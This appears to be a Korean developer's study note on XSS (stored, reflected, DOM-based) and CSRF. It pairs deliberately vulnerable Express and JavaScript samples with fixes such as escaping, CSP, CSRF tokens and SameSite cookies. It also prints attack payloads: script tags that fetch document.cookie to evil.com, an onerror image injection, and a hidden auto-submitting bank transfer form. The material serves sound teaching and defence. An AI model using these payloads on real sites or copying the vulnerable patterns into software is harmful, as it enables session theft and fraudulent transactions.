## 1. XSS


### 1.1 기본 개념

XSS는 공격자가 신뢰된 웹사이트에 자신의 악성 스크립트를 심어서 다른 사용자들이 해당 웹사이트를 이용할 때 심은 악성 스크립트가 실행되도록 하는 공격이다.

### 1.2 **Stored XSS**

아래와 같은 코드로 게시판 댓글 저장 기능이 구현 되어 있다고 하면,  
Stored XSS 공격을 받기 매우 쉽다. 이유는 사용자가 입력하는 값을 별도의 처리 없이 HTML 그대로 넣어 버리기 때문에 만약 악성 공격자 `<script></script>` 를 포함해서 댓글을 작성한다면 다른 사용자가 해당 댓글을 볼 때 실제로 스크립트가 작동하기 때문이다.

```jsx
// 서버: 댓글 저장 (검증 없음)
app.post('/comments', (req, res) => {
  db.save({ content: req.body.content }); // 그대로 저장
  res.send('ok');
});

// 클라이언트: 댓글 렌더링
function renderComment(comment) {
  document.getElementById('comments').innerHTML += comment.content;
}
```

공격자는 아래와 같이 댓글을 달면 공격을 할 수 있게 되는 것이다.  
이러면 다른 사용자들이 공격자의 댓글을 보면 사용자도 모르게 공격자의 서버로 사용자의 쿠키가 전송된다.

```jsx
좋은 글이네요! <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

방법 1처럼 이스케이핑을 거치게 되면 브라우저 입장에서는 실행 시켜야 하는 스크립트가 아니라 단순히 사용자에게 보여줘야 하는 순수한 문자열로 인식해서 악성 스크립트가 실행되지 않는다.

방법 2는 React 같은 라이브러리를 사용할 경우이긴 한데, React는 기본적으로 이스케이핑을 해버려서 개발자가 따로 이스케이핑을 해주지 않아도 된다.   
단, `dangerouslySetInnerHTML` 를 사용하게 되면 이스케이핑 없이 HTML 문자열을 그대로 넣어버려서 Stored XSS 공격을 당할 수 있다.

```jsx
// 방법 1: 출력 시 이스케이핑
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML; // <script> → &lt;script&gt;로 변환됨
}
document.getElementById('comments').innerHTML += escapeHtml(comment.content);

// 방법 2: React라면 애초에 이 문제가 자동으로 막힘
function Comment({ content }) {
  return <div>{content}</div>; // JSX는 자동 이스케이핑함
  // return <div dangerouslySetInnerHTML={{ __html: content }} /> 이건 위험함
}
```

방법 1, 2로도 못 막는 경우를 대비해서 브라우저에서 한 번 더 막을 수도 있다. 프론트엔드 서버가 응답 헤더에 CSP를 실어 보내면 브라우저가 정책에 어긋나는 스크립트 실행을 아예 거부한다.

```jsx
Content-Security-Policy: script-src 'self'
```
이렇게 하면 인라인 스크립트나 외부 스크립트가 삽입돼도 브라우저가 실행 자체를 막아버린다.

### 1.3 **Reflected XSS**

Reflected XSS는 검색 결과 페이지에서 검색 결과를 그대로 보여주는 경우 시도 할 수 있는 공격이다.

아래와 같이 서버에서 검색 결과에 대한 값을 반환해주는 코드가 작성되어 있다면 공격이 가능하다.

```jsx
// 서버: /search?q=검색어
app.get('/search', (req, res) => {
  res.send(`<h1>"${req.query.q}"에 대한 검색 결과</h1>`);
});
```

공격자가 사용자에게 아래와 같은 링크를 보낸다.  
만약 사용자가 이 링크를 누르게 된다면 서버로 `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` 에 관한 검색이 이루어지고 검색 결과가 있든, 없든 서버 코드에서는 검색어를 보여주게 되어 있기 때문에 사용자에게 `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` 를 보여주게 되고 여기서 부터는 아까 Stored XSS와 같이 악성 스크립트가 실행되게 된다.

```jsx
https://example.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

결국은 Reflected XSS도 마지막에는 Stored XSS와 공격 방식이 같아지기 때문에 똑같이 이스케이핑을 하게 되면 공격을 방어할 수 있다.

```jsx
const escapeHtml = (str) => str
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;');

app.get('/search', (req, res) => {
  res.send(`<h1>"${escapeHtml(req.query.q)}"에 대한 검색 결과</h1>`);
});
```

### 1.4 DOM-based XSS

DOM-based XSS는 서버를 거치지 않는다는 점에서 앞의 두 개와 다르다. 서버가 사용자 입력을 응답에 반영해서 생기는 문제가 아니라, 클라이언트 JS가 location.hash 같은 브라우저 값을 읽어서 그대로 DOM에 꽂아 넣는 과정에서 발생한다.

```jsx
// URL: https://example.com/page#환영합니다
const hash = decodeURIComponent(location.hash.slice(1));
document.getElementById('welcome').innerHTML = hash;
```

location.hash 값을 검증 없이 innerHTML에 넣고 있어서, 공격자가 아래 링크를 사용자에게 보내면

```jsx
https://example.com/page#<img src=x onerror=alert(document.cookie)>
```

해시 값이 그대로 삽입되면서 존재하지 않는 이미지를 로드하려다 실패해 onerror가 실행되고, 이 과정으로 스크립트가 동작하게 된다.

- 왜 바로 fetch를 안쓰고 이미지 로드 실패 시에 fetch를 쓰도록 공격할까?
    
    브라우저 보안 정책 때문에 # 뒤에 `<script></script>` 가 오게 되면 실행을 안 시켜 버린다.  
    그래서 이미지 태그를 넣고 일부러 안 불러오지게 해서 에러가 날 경우에 fetch가 실행 되도록 해서 브라우저 보안을 우회한다.
    

뒤의 값(fragment)은 브라우저가 서버로 전송하지 않기 때문에 서버 로그에도 안 남고 서버가 이 값을 본 적도 없다. 그래서 서버 쪽 이스케이핑으로는 막을 수 없고, 오직 클라이언트 코드 자체를 고쳐야 한다.

```jsx
// innerHTML 대신 textContent를 쓰면 태그로 해석되지 않고 문자열로만 표시됨
document.getElementById('welcome').textContent = hash;
```

location.hash, location.search, document.referrer처럼 사용자가 조작 가능한 값을 innerHTML, eval, document.write 같은 곳에 그대로 넣는 패턴을 피하는 게 근본적인 방어다.

## 2. CSRF


### 2.1 CSRF

사용자가 bank.com에 로그인한 상태로 공격자가 만든 evil.com에 접속 했을 때 CSRF 공격을 당할 수 있다.  
이때 evil.com에는 아래와 같은 내용의 코드가 숨겨져 있다.

브라우저는 폼이 제출될 때 bank.com을 보내면 알아서 bank.com에 대한 세션 쿠키를 자동으로 실어서 보내버린다. 서버는 쿠키만 보고 인증 됐다고 생각해서 돈을 보내리는 것이다.

```jsx
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST" style="display:none">
    <input name="to" value="공격자계좌번호">
    <input name="amount" value="1000000">
  </form>
</body>
```

CSRF 방어 방법은 크게 2가지가 있다.

가장 기본적인 방어로 사용자한테 입력 폼을 줄 때 랜덤 토큰을 함께 넘겨주고 요청을 받을 때 올바른 토큰인지 확인하는 방법이다.  
공격자 사이트 입장에서는 요청은 날리기만 하면 브라우저가 알아서 알맞는 쿠키를 같이 요청에 담아줬는데  
폼 안에 있는 토큰은 브라우저가 알아서 담아주지도 않고 알아낼 방법도 없다. 

```jsx
// 서버: 폼 렌더링 시 랜덤 토큰 발급, 세션에 저장
app.get('/transfer-form', (req, res) => {
  const csrfToken = generateRandomToken();
  req.session.csrfToken = csrfToken;
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="csrf_token" value="${csrfToken}">
      <input name="to"><input name="amount">
    </form>
  `);
});

// 서버: 요청 처리 시 토큰 검증
app.post('/transfer', (req, res) => {
  if (req.body.csrf_token !== req.session.csrfToken) {
    return res.status(403).send('CSRF 검증 실패');
  }
  // 정상 처리
});
```

쿠키를 발급할 때 SameSite 속성을 지정하면 다른 사이트 요청에는 브라우저가 자동으로 쿠키를 실어주지 않는다. evil.com에서 bank.com으로 요청을 날려도 브라우저가 쿠키를 실어주지 않는 것이다.  
사실상 CSRF의 공격 원리를 막아버리는 것이다.

```jsx
res.cookie('session', sessionId, {
  httpOnly: true,      // JS에서 접근 불가 (XSS 방어도 겸함)
  sameSite: 'Lax',     // cross-site 요청엔 쿠키 자동 첨부 안 됨
  secure: true
});
```


---
React가 이스케이핑까지 해서 보안까지 신경 쓰는 건 생각 못 했는데 내 생각보다 React 해주는 게 훨씬 더 많은 것 같다.  
XSS랑 CSRF 공부 해보니까 느껴지는 게 "옛날 사람들은 별 방법을 통해서 공격을 하려고 했고, 또 별 방법을 통해서 막으려고 했구나"가 느껴져서 좀 재밌는 옛날 이야기 든는 느낌도 난다.  
이런 보안쪽 부분도 생각보다 재밌는 것 같다 기회가 있을지는 모르겠지만, 나중에 프로젝트에서 보안을 신경쓸 부분이 생겨서 보안 부분도 꼼꼼하게 챙겨보면 좋은 경험이 되지 않을까 싶다.